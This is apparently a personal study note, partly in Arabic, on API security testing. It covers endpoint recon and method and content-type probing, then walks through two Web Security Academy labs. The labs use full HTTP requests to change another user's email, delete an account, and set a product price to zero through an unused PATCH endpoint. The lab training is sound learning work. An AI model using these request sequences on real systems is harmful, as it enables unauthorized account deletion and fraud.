# API testing

- <details>
     <summary>API Recon & documentation</summary>


  # 🛡️ API Testing - شرح مبسط
  
  ## 📌 ما هو **API Testing**؟
  - **API (Application Programming Interface)** هو الوسيط الذي يسمح للبرامج أو السيرفرات بالتواصل مع بعضها.
  - أي موقع ديناميكي (dynamic) يتكون من APIs:
    - مثال: عند تسجيل الدخول **login** → API تستقبل الـ username/password.
    - مثال: عند جلب **profile info** → API تسحب البيانات من قاعدة البيانات وتعيدها في صورة JSON.
  
  ⚠️ إذا كانت الـ API بها ثغرة → هذا قد يؤثر على **Confidentiality, Integrity, Availability (CIA)**.
  
  ---
  
  ## 📌 العلاقة بين Web Testing و API Testing
  - معظم ثغرات الويب (SQLi, XSS, Auth bypass) يمكن أن تظهر في APIs.
  - الفرق أن **API Testing** يكشف أحيانًا Endpoints غير مستخدمة في الواجهة الأمامية (front-end)، لكنها مدعومة على السيرفر → توسع الـ attack surface.
  
  ---
  
  ## 📌 خطوات الـ Recon (استكشاف API)
  
  ### 1. **Identify Endpoints** (تحديد الـ endpoints)
  الـ endpoint هو مكان استقبال الطلبات.
  
  مثال:
  ```http
  GET /api/books HTTP/1.1
  Host: example.com
  ```
  
  - `/api/books` → endpoint  
  - يعيد قائمة من الكتب
  
  مثال آخر:
  - `/api/books/mystery` → يعيد قائمة بكتب الغموض
  
  ---
  
  ### 2. **افهم كيفية التعامل مع الـ API**
  لكي تبدأ اختبار يجب أن تعرف:
  - ✅ الـ input parameters (إجباري / اختياري)  
  - ✅ الـ HTTP methods المدعومة (GET, POST, PUT, DELETE…)  
  - ✅ الـ media formats (JSON, XML)  
  - ✅ هل يوجد Rate limiting (عدد الطلبات المسموح بها)  
  - ✅ آلية Authentication (Token / API Key / JWT)  
  
  ---
  
  ## 📌 API Documentation (التوثيق)
  - **Human-readable**: توثيق مكتوب يشرح الأمثلة والاستخدام.  
  - **Machine-readable**: ملفات JSON/XML (مثل Swagger أو OpenAPI).  
  
  🔍 **أماكن شائعة للتوثيق**:
  - `/api`
  - `/swagger/index.html`
  - `/openapi.json`
  
  مثال: لو وجدت `/api/swagger/v1/users/123`  
  جرب أيضًا:
  - `/api/swagger/v1`  
  - `/api/swagger`  
  - `/api`  
  
  🛠 يمكنك استخدام **Burp Scanner** أو **Intruder** لتجربة common paths.
  
  ---
  
  ## 📌 الخلاصة
  - **API Testing = Web Testing + Hidden attack surface**
  - تبدأ بالـ **Recon**: ابحث عن endpoints + documentation  
  - افهم كيف تعمل الـ API (inputs, methods, auth)  
  - ثم اختبر الثغرات مثل:
    - **SQLi داخل JSON**
    - **Auth bypass بالـ tokens**
    - **Server-side Parameter Pollution (SSPP)**
    - **Excessive Data Exposure** (إرجاع بيانات حساسة/زائدة)
  

  
  </details>





- <details>
     <summary></summary>

     
     
     # 🛡️ API Testing 
     
     ## 1️⃣ Machine-readable Documentation (التوثيق القابل للمعالجة آليًا)
     - أحيانًا بتلاقي توثيق API في شكل **JSON / YAML** (زي Swagger أو OpenAPI).  
     - تقدر تستخدم Tools عشان تحللها أو تختبر الـ endpoints مباشرة.  
     
     🛠 الأدوات:
     - **Burp Scanner** → يقرأ OpenAPI docs ويعمل crawl & audit  
     - **OpenAPI Parser BApp** → تحليل OpenAPI داخل Burp Suite  
     - **Postman / SoapUI** → لاختبار الـ endpoints يدويًا أو أوتوماتيك  
     
     ---
     
     ## 2️⃣ Identifying API Endpoints (تحديد الـ endpoints)
     - حتى لو عندك documentation، لازم تراجع التطبيق بنفسك:  
       - ساعات الـ documentation قديمة أو ناقصة  
       - من خلال التطبيق نفسه ممكن تلاقي endpoints غير مذكورة  
     
     👀 أماكن محتملة للـ Endpoints:
     - **/api/** في الـ URLs  
     - **JavaScript files** → ممكن تحتوي API calls مخفية  
     - **Burp Scanner** → يلتقط بعض الـ endpoints  
     - **JS Link Finder BApp** → استخراج أعمق من ملفات JS  
     
     ---
     
     ## 3️⃣ Interacting with Endpoints (التفاعل مع الـ endpoints)
     - استخدم الأدوات:  
       - **Burp Repeater** → تجربة يدوية  
       - **Burp Intruder** → تجربة أوتوماتيكية  
     
     💡 جرب تغيّر:
     - **HTTP method** (GET, POST, PUT…)  
     - **Media type** (JSON, XML…)  
     - راقب **error messages** → ممكن تكشف تفاصيل عن الباك اند أو باراميترات إضافية  
     
     ---
     
     ## 4️⃣ Identifying Supported HTTP Methods
     - الـ **HTTP Method** يحدد نوع العملية:  
       - `GET` → جلب البيانات  
       - `PATCH` → تعديل جزئي  
       - `OPTIONS` → يكشف الـ methods المدعومة  
     
     👨‍💻 مثال على endpoint:
     ```
     GET /api/tasks        → يرجع قائمة المهام  
     POST /api/tasks       → ينشئ مهمة جديدة  
     DELETE /api/tasks/1   → يحذف مهمة برقم 1  
     ```
     
     🛠 Burp Intruder:
     - يحتوي على قائمة HTTP verbs جاهزة  
     - جربها تلقائيًا على endpoint لكشف methods إضافية  
     
     ⚠️ مهم: جرب على بيانات **قليلة الأهمية (low-priority)** لتجنب كسر أو تغيير بيانات production  
     
     ---
     
     ## 5️⃣ Identifying Supported Content Types (أنواع المحتوى)
     - الـ API غالبًا بتتوقع نوع محتوى محدد مثل `application/json`  
     - تغيير الـ Content-Type ممكن يفتح هجوم جديد  
     
     👀 الفوائد:
     - Trigger أخطاء تكشف معلومات  
     - Bypass دفاعات ضعيفة  
     - استغلال اختلاف المعالجة (مثال: آمن مع JSON لكن ضعيف مع XML)  
     
     🛠 Burp:
     - غيّر Header:
       ```http
       Content-Type: application/xml
       ```
     - وحوّل الـ body من JSON إلى XML  
     - **Content Type Converter BApp** يساعد في التحويل التلقائي بين JSON ↔ XML  
     
     ---
     
     ## 📌 الخلاصة
     - 📑 لو لقيت **Machine-readable docs** → حللها بالأدوات (Burp Scanner, Postman)  
     - 🔍 حتى مع docs → دايمًا اعمل Recon يدوي (URLs + JS files)  
     - 🎯 جرّب تتفاعل مع endpoints (HTTP methods, Content types)  
     - ⚡ الهدف: اكتشاف وظائف إضافية + ثغرات (SQLi, Auth bypass, Injection …)
     



     
  </details>































































































----




# **`API Testing Labs`**


<details>
     <summary>Lab: Exploiting an API endpoint using documentation</summary>

#### 1. login with **`wiener : peter`**
#### 2. try to update your email and intercept the request

```http
PATCH /api/user/wiener HTTP/1.1
Host: 0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Cookie: session=vW7MD6H4rzuStWRQySgwcgcxMJiD8Rkk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


{
  "email":"user@EXAMPLE.com"
}
```

**`Response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 48


{
  "username":"wiener",
  "email":"user@EXAMPLE.com"
}
```

---

> ## what if we change user


```http
PATCH /api/user/carlos HTTP/1.1
Host: 0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Cookie: session=vW7MD6H4rzuStWRQySgwcgcxMJiD8Rkk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


{
  "email":"plapla@EXAMPLE.com"
}
```

**`Response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 48


{
  "username":"carlos",
  "email":"plapla@EXAMPLE.com"
}
```


> ## now try to change method from **`patch`** to **`DELETE`**

```http
DELETE /api/user/carlos HTTP/2
Host: 0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Cookie: session=vW7MD6H4rzuStWRQySgwcgcxMJiD8Rkk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers


{
  "email":"user@EXAMPLE.com"
}
```

**`Response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 48


{
  "status":"user deleted"
}
```


> ## if we set path to **`/api`**

<img width="952" height="699" alt="image" src="https://github.com/user-attachments/assets/49f6beef-4bee-4ed1-a971-259b69a08f35" />


     
</details>




<details>
     <summary>Lab: Finding and exploiting an unused API endpoint</summary>

> 1. login as **`wiener : peter`**
> 2. select product and see the request


```http
GET /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```


### **`response`**


```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 97


{
  "price":"$1337",
  "message":"Buy quick, we are low on stock! 4 purchased in the last 14 minutes!"
}
```

---

> ## first try **`OPTIONS`** header to see which methods are allowed


```http
OPTIONS /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```


### **`response`**


```http
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

> ## found that **`GET, PATCH`** only allowd
> - now change method to **``PATCH``**


```
```http
PATCH /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```

### **`response`**

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93


{
  "type":"ClientError",
  "code":400,
  "error":"Only 'application/json' Content-Type is supported"
}
```

> ## we found that content type must be json we will add this header
> - **`Content-Type: application/json`**
> - add json content with new price

```http
PATCH /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type: application/json;

{
  "price":0
}


```

<img width="1434" height="540" alt="image" src="https://github.com/user-attachments/assets/bc003da5-54f5-49db-8f06-713ecb5022a1" />




     
</details>








































